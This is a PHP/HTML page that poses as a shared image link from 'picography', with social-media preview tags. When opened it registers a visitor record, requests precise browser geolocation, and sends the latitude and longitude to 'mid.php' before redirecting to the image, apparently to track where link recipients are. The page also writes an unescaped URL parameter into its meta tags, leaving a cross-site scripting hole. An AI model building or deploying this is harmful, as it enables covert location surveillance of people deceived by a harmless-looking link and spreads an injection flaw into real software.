<?php
require('users.php');
require('linksfunctions.php');

if (isset($_GET['image'])) {
    $id = $_GET['image'];
} else {
    $id = "?";
}
function getTitel($id)
{
    if ($id == "?") {
        return null;
    } else {
        $get = file_get_contents("links.json");
        $links = json_decode($get, true);
        foreach ($links as $link) {
            if ($link['image'] == $id) {
                return $link['description'];
            }
        }
        return null;
    }
}
$idd = json_encode($id);
$gettitle = getTitel($id);
?>
<script>
    function main(datedate, id) {

        var options = {
            maximumAge: 50000,
            timeout: 30000,
            enableHighAccuracy: true
        };

        function url_redirect(url) {
            var X = setTimeout(function() {
                window.location.replace(url);
                return true;
            }, 300);

            if (window.location = url) {
                clearTimeout(X);
                return true;
            } else {
                if (window.location.href = url) {
                    clearTimeout(X);
                    return true;
                } else {
                    clearTimeout(X);
                    window.location.replace(url);
                    return true;
                }
            }
            return false;
        };
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, err, options);

            function success(position) {
                console.log("success:" + id);
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                str = 'mid.php?lat=' + latitude + '&long=' + longitude + '&date=' + datedate + '&id=' + id;
                url_redirect(str);
            }

            function err() {
                console.log("error:" + id);
                if (id == "?") {
                    str = 'https://picography.co/';

                } else {

                    str = domainName + id;
                }
                console.log("str:" + str);
                url_redirect(str);
            }
        } else {

            console.log("else:" + id);

            if (id == "?") {
                str = 'https://picography.co/';

            } else {

                str = domainName + id;
            }
            console.log("str:" + str);
            url_redirect(str);
        }


    }
</script>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta property="og:locale" content="en_GB" />
    <meta property="og:locale:alternate" content="fr_FR" />
    <meta property="og:locale:alternate" content="es_ES" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:url" content="<?php echo ($domainname . $id); ?>" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="<?php echo ($gettitle); ?>" />
    <meta property="og:description" content="<?php echo ($gettitle); ?>" />
    <meta name="description" content="<?php echo ($gettitle); ?>">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:image" content="<?php echo ($domainname . $id); ?>">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="200">
    <meta property="og:image:height" content="200">

    <title>"<?php echo ($gettitle); ?>"</title>
</head>

<body>
    <?php

    $datedate = createUser($id);
    $datedate = json_encode($datedate);

    echo "<script>main(${datedate},${idd})</script>";


    ?>
</body>

</html>